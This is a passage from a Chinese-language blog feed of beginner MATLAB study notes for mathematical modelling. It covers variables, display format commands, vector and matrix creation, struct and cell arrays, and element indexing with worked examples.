class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">函数句柄变量 = @函数名 <span class="hljs-comment">% 这里已经存在的函数包括内部函数或自定义函数；函数句柄变量相当于函数的别名。</span><br></code></pre></div></td></tr></table></figure><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; h=@<span class="hljs-built_in">sin</span><br><br>h =<br><br>    @<span class="hljs-built_in">sin</span><br><br>&gt;&gt; h(<span class="hljs-built_in">pi</span>/<span class="hljs-number">2</span>)<br><br><span class="hljs-built_in">ans</span> =<br><br>     <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数学建模-Matlab学习笔记（三）</title>
    <link href="/2021/05/28/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2021/05/28/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>MATLAB（矩阵实验室）是第四代高层次的编程语言和交互式环境数值计算，可视化和编程。由美国MathWorks公司开发的一种编程语言。用于算法开发、数据可视化、数据分析以及数值计算的高级技术计算语言和交互式环境，主要包括MATLAB和Simulink两大部分。拥有众多的内置命令和数学函数，可以帮助您在数学计算，绘图和执行数值计算方法。 </p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-MATLAB-变量"><a href="#1-MATLAB-变量" class="headerlink" title="1.MATLAB 变量"></a>1.MATLAB 变量</h2><p>每个MATLAB变量可以是数组或者矩阵。变量是在程序运行中值可以改变的量，变量由变量名来表示。在 MATLAB 语言中变量的命名遵循如下规则：</p><ul><li>变量名区分大小写。</li><li>变量名长度不得超过 31 位，第 31 个字符之后的字符将被 MATLAB 语言所忽略。</li><li>变量名以字母开头，可以是字母、数字、下划线组成，但不能使用标点。</li></ul><p>MATLAB 不要求事先对变量进行声明，也不需要指定变量类型，但使用变量前，必须进行赋值。 MATLAB 会自动依据所赋予变量的值或对变量所进行的操作来识别变量的类型。在赋值过程中如果如果赋值变量已存在时，MATLAB 将使用新值代替旧值，并以新值类型代替旧值类型。在未加特殊说明的情况下，MATLAB 语言将所识别的一切变量视为局部变量，即仅在其使用的 M 文件内有效。若要将变量定义为全局变量，则应当对变量进行说明，即在该变量前加关键字 global。一般来说，全局变量均用大写的英文字符表示。</p><p>在 MATLAB 中，有一类特殊的变量，是由系统默认给定符号来表示的。</p><table><thead><tr><th align="center">变量名称</th><th align="center">变量含义</th><th align="center">变量名称</th><th align="center">变量含义</th></tr></thead><tbody><tr><td align="center"><code>ans</code></td><td align="center">MATLAB 中的默认变量</td><td align="center"><code>i(j)</code></td><td align="center">复数中的虚数单位</td></tr><tr><td align="center"><code>pi</code></td><td align="center">圆周率</td><td align="center"><code>nargin</code></td><td align="center">所用函数的输入变量数</td></tr><tr><td align="center"><code>eps</code></td><td align="center">计算机中的最小数，PC 机上为 2的负 52 次方</td><td align="center"><code>nargout</code></td><td align="center">所用函数的输出变量数</td></tr><tr><td align="center"><code>inf</code></td><td align="center">无穷大，如 1/0</td><td align="center"><code>realmin</code></td><td align="center">最小可用正实数</td></tr><tr><td align="center"><code>NaN</code></td><td align="center">不定值，如 0/0 等</td><td align="center"><code>realmax</code></td><td align="center">最大可用正实数</td></tr></tbody></table><p>示例1：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">x = <span class="hljs-number">3</span><span class="hljs-comment">%定义x并用一个值初始化</span><br></code></pre></div></td></tr></table></figure><p>示例2：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">y = <span class="hljs-built_in">sqrt</span>(<span class="hljs-number">16</span>) <span class="hljs-comment">%定义x并用表达式初始化 </span><br></code></pre></div></td></tr></table></figure><p>示例3：当表达式返回一个结果，不分配给任何变量，系统分配给一个变量命名ans，以后可以继续使用。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">sqrt</span>(<span class="hljs-number">78</span>)<br></code></pre></div></td></tr></table></figure><p>MATLAB可以多个赋值。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">a = <span class="hljs-number">2</span>; b = <span class="hljs-number">7</span>; c = a * b<br></code></pre></div></td></tr></table></figure><h3 id="1-1-MATLAB-显示已经使用的变量名"><a href="#1-1-MATLAB-显示已经使用的变量名" class="headerlink" title="1.1 MATLAB 显示已经使用的变量名"></a>1.1 MATLAB 显示已经使用的变量名</h3><p>可以使用 who 命令显示所有已经使用的变量名。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">who<br><span class="hljs-comment">%输出</span><br>Your variables are:<br>a    <span class="hljs-built_in">ans</span>  b    c    x    y    <br></code></pre></div></td></tr></table></figure><p><strong>whos 命令</strong></p><ul><li>当前内存中的变量</li><li>每个变量的类型</li><li>内存分配给每个变量</li><li>无论他们是复杂的变量与否</li></ul><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">whos<br><span class="hljs-comment">%输出</span><br>  Name      Size            Bytes  Class     Attributes<br><br>  a         <span class="hljs-number">1</span>x1                 <span class="hljs-number">8</span>  double              <br>  <span class="hljs-built_in">ans</span>       <span class="hljs-number">1</span>x1                 <span class="hljs-number">8</span>  double              <br>  b         <span class="hljs-number">1</span>x1                 <span class="hljs-number">8</span>  double              <br>  c         <span class="hljs-number">1</span>x1                 <span class="hljs-number">8</span>  double              <br>  x         <span class="hljs-number">1</span>x1                 <span class="hljs-number">8</span>  double              <br>  y         <span class="hljs-number">1</span>x1                 <span class="hljs-number">8</span>  double      <br></code></pre></div></td></tr></table></figure><h3 id="1-2-删除变量"><a href="#1-2-删除变量" class="headerlink" title="1.2 删除变量"></a>1.2 删除变量</h3><p>clear命令删除所有（或指定）从内存中的变量（S）。</p><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">clear x     <span class="hljs-comment">% 删除x，不会显示任何内容</span><br>clear     <span class="hljs-comment">% 删除所有变量</span><br></code></pre></div></td></tr></table></figure><h3 id="1-3-长任务（续行符）"><a href="#1-3-长任务（续行符）" class="headerlink" title="1.3 长任务（续行符）"></a>1.3 长任务（续行符）</h3><p>长任务是可以通过使用省略号（…）延伸到另一条线路。</p><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">initial_velocity = <span class="hljs-number">0</span>;<br>acceleration = <span class="hljs-number">9.8</span>;<br>time = <span class="hljs-number">20</span>;<br>final_velocity = initial_velocity ...<br>    + acceleration * time<br><br><span class="hljs-comment">% 输出</span><br>final_velocity =<br>   <span class="hljs-number">196</span><br></code></pre></div></td></tr></table></figure><h3 id="1-4-格式命令"><a href="#1-4-格式命令" class="headerlink" title="1.4 格式命令"></a>1.4 格式命令</h3><p>默认情况下，MATLAB 四个小数位值显示数字。这就是所谓的 short format。如果想更精确，需要使用 format 命令。长（long ） 命令格式显示小数点后16位。</p><p>示例1：format long</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">format long<br>x = <span class="hljs-number">7</span> + <span class="hljs-number">10</span>/<span class="hljs-number">3</span> + <span class="hljs-number">5</span> ^ <span class="hljs-number">1.2</span><br><span class="hljs-comment">%输出</span><br>x =<br>  <span class="hljs-number">17.231981640639408</span><br></code></pre></div></td></tr></table></figure><p>示例2：format short</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">format short<br>x = <span class="hljs-number">7</span> + <span class="hljs-number">10</span>/<span class="hljs-number">3</span> + <span class="hljs-number">5</span> ^ <span class="hljs-number">1.2</span><br><span class="hljs-comment">% 输出</span><br>x =<br>   <span class="hljs-number">17.2320</span><br></code></pre></div></td></tr></table></figure><p>示例3：空格格式命令回合到小数点后两位数字。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">format bank<br>daily_wage = <span class="hljs-number">177.45</span>;<br>weekly_wage = daily_wage * <span class="hljs-number">6</span><br><span class="hljs-comment">%输出</span><br>weekly_wage =<br>       <span class="hljs-number">1064.70</span><br></code></pre></div></td></tr></table></figure><blockquote><ol><li>MATLAB 显示大量使用指数表示法。短格式 e命令 允许以指数的形式显示小数点后四位，加上指数。<br>示例：</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">format short e<br><span class="hljs-number">4.678</span> * <span class="hljs-number">4.9</span><br><span class="hljs-comment">%输出</span><br><span class="hljs-built_in">ans</span> =<br>   <span class="hljs-number">2.2922e+01</span> <br></code></pre></div></td></tr></table></figure><p>（自我理解）需要注意的是，如：4.678<em>4.9=2.2922e+01 ，正常结果为 22.922 ，其中 2.2922e+01 后面的 +01 表示的是从右边（正方向）向左边（负方向）移动了 1 个小数点后的结果；再如：0.234</em>0.124=2.9016e-02，正常结果为 0.029016，其中 2.9016e-02 后面的 -02 表示从左边（负方向）向右边（正方向）移动了2 个小数点后的结果。<strong>且保留4位小数点时，会四舍五入掉第5位数。</strong></p><blockquote><ol start="2"><li>format long e命令允许以指数的形式显示小数点后十六位，加上指数。</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">format long e<br>x = <span class="hljs-built_in">pi</span><br><span class="hljs-comment">%输出</span><br>x =<br>     <span class="hljs-number">3.141592653589793e+00</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>format rat 格式命令给出最接近的有理表达式，从计算所得。</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">format <span class="hljs-built_in">rat</span><br><span class="hljs-number">4.678</span> * <span class="hljs-number">4.9</span><br><span class="hljs-comment">% 输出</span><br><span class="hljs-built_in">ans</span> =<br>   <span class="hljs-number">2063</span>/<span class="hljs-number">90</span>  <br></code></pre></div></td></tr></table></figure><h3 id="1-5-关键字"><a href="#1-5-关键字" class="headerlink" title="1.5 关键字"></a>1.5 关键字</h3><p>MATLAB 的关键字是指预先定义的有特别意义的标识符，有时也叫保留字。像其他语言一样，MATLAB 包含算数运算、逻辑运算、关系运算等运算类型，每种类型的运算都有自己的运算符，并可对关系和逻辑进行运算，而且都有相应的运算函数。这些有特定意义的符号和名字是不能被指定为变量名称的。比如下表中的特殊变量名、MATLAB 的管理类命令、编程控制语句等。</p><h3 id="1-6-创建向量"><a href="#1-6-创建向量" class="headerlink" title="1.6 创建向量"></a>1.6 创建向量</h3><p>向量是一维数组中的数字。 MATLAB允许创建两种类型的矢量：行向量、列向量。</p><h4 id="1-6-1-行向量"><a href="#1-6-1-行向量" class="headerlink" title="1.6.1 行向量"></a>1.6.1 行向量</h4><p>创建行向量包括在方括号中的元素的集合，用空格或逗号分隔的元素。<br>示例1：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">r = [<span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">10</span> <span class="hljs-number">11</span>]<br><span class="hljs-comment">% 返回结果</span><br>r =<br><br>     <span class="hljs-number">7</span>     <span class="hljs-number">8</span>     <span class="hljs-number">9</span>    <span class="hljs-number">10</span>    <span class="hljs-number">11</span><br></code></pre></div></td></tr></table></figure><p>示例2：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">r = [<span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">10</span> <span class="hljs-number">11</span>];<br>t = [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>];<br>res = r + t<br><span class="hljs-comment">%输出</span><br>res =<br><br>     <span class="hljs-number">9</span>    <span class="hljs-number">11</span>    <span class="hljs-number">13</span>    <span class="hljs-number">15</span>    <span class="hljs-number">17</span><br></code></pre></div></td></tr></table></figure><h4 id="1-6-2-列向量"><a href="#1-6-2-列向量" class="headerlink" title="1.6.2 列向量"></a>1.6.2 列向量</h4><p>创建列向量通过方括号中的元素，使用分号（;）分隔。<br>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">c = [<span class="hljs-number">7</span>;  <span class="hljs-number">8</span>;  <span class="hljs-number">9</span>;  <span class="hljs-number">10</span>; <span class="hljs-number">11</span>]<br><span class="hljs-comment">% 输出</span><br>c =<br>       <span class="hljs-number">7</span>       <br>       <span class="hljs-number">8</span>       <br>       <span class="hljs-number">9</span>       <br>      <span class="hljs-number">10</span>       <br>      <span class="hljs-number">11</span>  <br></code></pre></div></td></tr></table></figure><h3 id="1-7-创建矩阵"><a href="#1-7-创建矩阵" class="headerlink" title="1.7 创建矩阵"></a>1.7 创建矩阵</h3><h4 id="1-7-1-直接输入"><a href="#1-7-1-直接输入" class="headerlink" title="1.7.1 直接输入"></a>1.7.1 直接输入</h4><p>矩阵是一个二维数字阵列。在MATLAB中，创建一个矩阵每行输入空格或逗号分隔的元素序列，最后一排被划定一个分号。<br>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">m = [<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>; <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span>; <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>]<br><span class="hljs-comment">% 输出</span><br>m =<br>       <span class="hljs-number">1</span>              <span class="hljs-number">2</span>              <span class="hljs-number">3</span>       <br>       <span class="hljs-number">4</span>              <span class="hljs-number">5</span>              <span class="hljs-number">6</span>       <br>       <span class="hljs-number">7</span>              <span class="hljs-number">8</span>              <span class="hljs-number">9</span>     <br></code></pre></div></td></tr></table></figure><h4 id="1-7-2-利用已有的矩阵创建"><a href="#1-7-2-利用已有的矩阵创建" class="headerlink" title="1.7.2 利用已有的矩阵创建"></a>1.7.2 利用已有的矩阵创建</h4><p>一个大矩阵可以由已经存在的小矩阵拼接而成。<br>实例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">a=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>;<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>];<br>b=[<span class="hljs-number">-1</span>,<span class="hljs-number">-2</span>,<span class="hljs-number">-3</span>;<span class="hljs-number">-4</span><span class="hljs-number">-5</span><span class="hljs-number">-6</span>;<span class="hljs-number">-7</span><span class="hljs-number">-8</span><span class="hljs-number">-9</span>];<br>c=[a,b;b,a]<br></code></pre></div></td></tr></table></figure><h4 id="1-7-3-用实部矩阵和复数矩阵构建复数矩阵"><a href="#1-7-3-用实部矩阵和复数矩阵构建复数矩阵" class="headerlink" title="1.7.3 用实部矩阵和复数矩阵构建复数矩阵"></a>1.7.3 用实部矩阵和复数矩阵构建复数矩阵</h4><p>实例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">b=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>];<br>c=[<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>;<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>];<br>a=b+<span class="hljs-built_in">i</span>*c<br></code></pre></div></td></tr></table></figure><h4 id="1-7-4-结构矩阵和单元矩阵"><a href="#1-7-4-结构矩阵和单元矩阵" class="headerlink" title="1.7.4 结构矩阵和单元矩阵"></a>1.7.4 结构矩阵和单元矩阵</h4><h5 id="1-7-4-1-结构矩阵"><a href="#1-7-4-1-结构矩阵" class="headerlink" title="1.7.4.1 结构矩阵"></a>1.7.4.1 结构矩阵</h5><p>格式为：<code>结构矩阵元素.成员名=表达式</code><br>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">a(<span class="hljs-number">1</span>).x1=<span class="hljs-number">10</span>;a(<span class="hljs-number">1</span>).x2=<span class="hljs-string">&#x27;a&#x27;</span>;a(<span class="hljs-number">1</span>).x3=[<span class="hljs-number">11</span>,<span class="hljs-number">22</span>;<span class="hljs-number">33</span>,<span class="hljs-number">44</span>];<br>a(<span class="hljs-number">2</span>).x1=<span class="hljs-number">12</span>;a(<span class="hljs-number">2</span>).x2=<span class="hljs-string">&#x27;wa&#x27;</span>;a(<span class="hljs-number">2</span>).x3=[<span class="hljs-number">22</span>,<span class="hljs-number">33</span>;<span class="hljs-number">44</span>,<span class="hljs-number">55</span>];<br></code></pre></div></td></tr></table></figure><h5 id="1-7-4-2-单元矩阵"><a href="#1-7-4-2-单元矩阵" class="headerlink" title="1.7.4.2 单元矩阵"></a>1.7.4.2 单元矩阵</h5><p>建立方式与一般矩阵相似，只是单元矩阵元素用大括号括起来。<br>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; b=&#123;<span class="hljs-number">12</span>,<span class="hljs-string">&#x27;aw&#x27;</span>,[<span class="hljs-number">11</span>,<span class="hljs-number">22</span>;<span class="hljs-number">33</span>,<span class="hljs-number">44</span>];<span class="hljs-number">13</span>,<span class="hljs-string">&#x27;bb&#x27;</span>,[<span class="hljs-number">33</span>,<span class="hljs-number">33</span>;<span class="hljs-number">44</span>,<span class="hljs-number">55</span>];...<br>  <span class="hljs-number">14</span>,<span class="hljs-string">&#x27;qq&#x27;</span>,[<span class="hljs-number">43</span>,<span class="hljs-number">23</span>;<span class="hljs-number">34</span>,<span class="hljs-number">52</span>]<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-8-矩阵元素的引用"><a href="#1-8-矩阵元素的引用" class="headerlink" title="1.8 矩阵元素的引用"></a>1.8 矩阵元素的引用</h3><h4 id="1-8-1-通过下标"><a href="#1-8-1-通过下标" class="headerlink" title="1.8.1 通过下标"></a>1.8.1 通过下标</h4><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">a(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>) <span class="hljs-comment">% 表示 a 矩阵第3行第2列的元素</span><br></code></pre></div></td></tr></table></figure><h4 id="1-8-2-通过序号"><a href="#1-8-2-通过序号" class="headerlink" title="1.8.2 通过序号"></a>1.8.2 通过序号</h4><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><br>a=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]<br><br>a(<span class="hljs-number">3</span>) <span class="hljs-comment">% 等于2</span><br></code></pre></div></td></tr></table></figure><p>其中，序号与下标是一 一对应的，以 <code>m * n</code>矩阵 A 为例，矩阵元素 <code>A(i,j)</code>的序号为<code>(j-1)*m+i</code>。</p><p>矩阵元素的序号与下标可以利用<code>sub2ind</code>和<code>ind2sub</code>函数实现相互转换。</p><blockquote><ol><li><code>sub2ind函数</code></li></ol></blockquote><p><code>sub2ind</code>：将矩阵中指定元素的行、列下标转换成存储的序号。格式为：<code>D=sub2ind(S,I,J)</code>。其中，<code>D</code>为对应下标元素的序号；<code>S</code>为行数和列数组成的向量；<code>I</code>转换矩阵元素的行下标;<code>J</code>转换矩阵元素的列下标。<br>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; A=[<span class="hljs-number">1</span>:<span class="hljs-number">3</span>;<span class="hljs-number">4</span>:<span class="hljs-number">6</span>]<br>A = <br><span class="hljs-number">1</span><span class="hljs-number">2</span><span class="hljs-number">3</span><br><span class="hljs-number">4</span><span class="hljs-number">5</span><span class="hljs-number">6</span><br><br>&gt;&gt; D=<span class="hljs-built_in">sub2ind</span>(<span class="hljs-built_in">size</span>(A),[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>;<span class="hljs-number">2</span>,<span class="hljs-number">2</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>;<span class="hljs-number">3</span>,<span class="hljs-number">2</span>]) <span class="hljs-comment">% size(A)为2行3列</span><br>D = <br><span class="hljs-number">1</span><span class="hljs-number">2</span> <span class="hljs-comment">% (1,1) (2,1)</span><br><span class="hljs-number">6</span><span class="hljs-number">4</span> <span class="hljs-comment">% (2,3) (2,2)</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li><code>ind2sub函数</code></li></ol></blockquote><p><code>ind2sub</code>：将把矩阵元素的序号转换成对应的下标。格式为：<code>[i,j]=ind2sub(S,D)</code>。其中，<code>[i,j]</code>分别为行下表和列下标；<code>S</code>为行数和列数组成的向量；<code>D</code>为序号。</p><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; [<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>]=<span class="hljs-built_in">ind2sub</span>([<span class="hljs-number">3</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>])<br><span class="hljs-built_in">i</span> =<br><span class="hljs-number">1</span><span class="hljs-number">3</span><span class="hljs-number">2</span><br><span class="hljs-built_in">j</span> = <br><span class="hljs-number">1</span><span class="hljs-number">1</span><span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure><h3 id="1-9-利用冒号表达式获得子矩阵"><a href="#1-9-利用冒号表达式获得子矩阵" class="headerlink" title="1.9 利用冒号表达式获得子矩阵"></a>1.9 利用冒号表达式获得子矩阵</h3><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">A(<span class="hljs-built_in">i</span>,:) <span class="hljs-comment">% 第 i 行的全部元素</span><br>A(:,<span class="hljs-built_in">j</span>) <span class="hljs-comment">% 第 j 列的全部元素</span><br>A(<span class="hljs-built_in">i</span>:<span class="hljs-built_in">i</span>+m,k:k+m) <span class="hljs-comment">% 第i~i+m行内且在第k~k+m列中的所有元素</span><br>A(<span class="hljs-built_in">i</span>:<span class="hljs-built_in">i</span>+m,:) <span class="hljs-comment">% 第i~i+m行的全部元素</span><br></code></pre></div></td></tr></table></figure><blockquote><ol><li><code>end运算符</code>：表示某一维的末尾元素下标。</li></ol></blockquote><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; A=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>;<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>;<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>;<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>]<br>&gt;&gt; A(<span class="hljs-keyword">end</span>,:)<br><span class="hljs-built_in">ans</span> =<br><span class="hljs-number">16</span> <span class="hljs-number">17</span> <span class="hljs-number">18</span> <span class="hljs-number">19</span> <span 